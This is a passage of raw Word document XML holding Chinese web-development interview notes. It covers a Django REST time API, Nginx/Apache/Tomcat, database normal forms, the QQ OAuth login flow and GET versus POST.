          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>发送时间时区</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EFD33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当前的问题是用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>rest framework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>模块做一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>请求的发送时间以及时区信息的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4986844D"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class getCurrenttime(APIView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488E54F7"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def get(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175E5D27"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local_time = time.localtime()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A285758"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        time_zone =settings.TIME_ZONE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AB8AF6"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temp = {'localtime':local_time,'timezone':time_zone}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FEB77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return Response(temp)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D2121F" w14:textId="7B23CBCD"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7 nginx,tomcat,apach</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>到都是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030E15B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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>engine x)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>是一个高性能的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>和反向代理服务器，也是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>IMAP/POP3/SMTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>服务器，工作在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>OSI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>七层，负载的实现方式：轮询</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">IP_HASH,fair,session_sticky. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E62E664"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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Apache HTTP Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>是一个模块化的服务器，源于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>NCSAhttpd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Tomcat </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>服务器是一个免费的开放源代码的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>应用服务器，属于轻量级应用服务器，是开发和调试</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>JSP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>程序的首选。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432D61EC" w14:textId="274E5ECD"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 xml:space="preserve">8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>请给出你熟悉关系数据库范式有哪些，有什么作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F12722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在进行数据库的设计时，所遵循的一些规范，只要按照设计规范进行设计，就能设计出没有数据冗余和数据维护异常的数据库结构。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B3013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数据库的设计的规范有很多，通常来说我们在设是数据库时只要达到其中一些规范就可以了，这些规范又称之为数据库的三范式，一共有三条，也存在着其他范式，我们只要做到满足前三个范式的要求，就能设陈出符合我们的数据库了，我们也不能全部来按照范式的要求来做，还要考虑实际的业务使用情况，所以有时候也需要做一些违反范式的要求。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B425ECB"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数据库设计的第一范式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>最基本</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，基本上所有数据库的范式都是符合第一范式的，符合第一范式的表具有以下几个特点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>数据库表中的所有字段都只具有单一属性，单一属性的列是由基本的数据类型（整型，浮点型，字符型等）所构成的设计出来的表都是简单的二比表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3B53FC"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数据库设计的第二范式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是在第一范式的基础上设计的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，要求一个表中只具有一个业务主键，也就是说符合第二范式的表中不能存在非主键列对只对部分主键的依赖关系</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B11B3E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数据库设计的第三范式，指每一个非主属性既不部分依赖与也不传递依赖于业务主键，也就是第二范式的基础上消除了非主属性对主键的传递依赖</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512F7816" w14:textId="0497A489"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sidR="001C72C9">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>QQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>登陆过程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251ED5A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qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>登录，在我们的项目中分为了三个接口，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF77CE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第一个接口是请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器返回一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>登录的界面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73806357"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第二个接口是通过扫码或账号登陆进行验证，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器返回给浏览器一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>state,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>利用这个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>通过本地服务器去向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器获取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>access_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>覆返回给本地服务器，凭借</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>access_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>再向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器获取用户的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>openid(openid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>用户的唯一标识</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6FF93E"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第三个接口是判断用户是否是第一次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>登录，如果不是的话直接登录返回的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>jwt-token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>给用户，对没有绑定过本网站的用户，对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>openid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>进行加密生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>进行绑定</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B98416"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2.10 post </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590CFB2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1.GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是从服务器上获取数据，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是向服务器传送数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620D26F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在客户端，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>方式在通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>提交数据，数据在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中可以看到，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>方式，数据放置在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HTML——HEADER</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
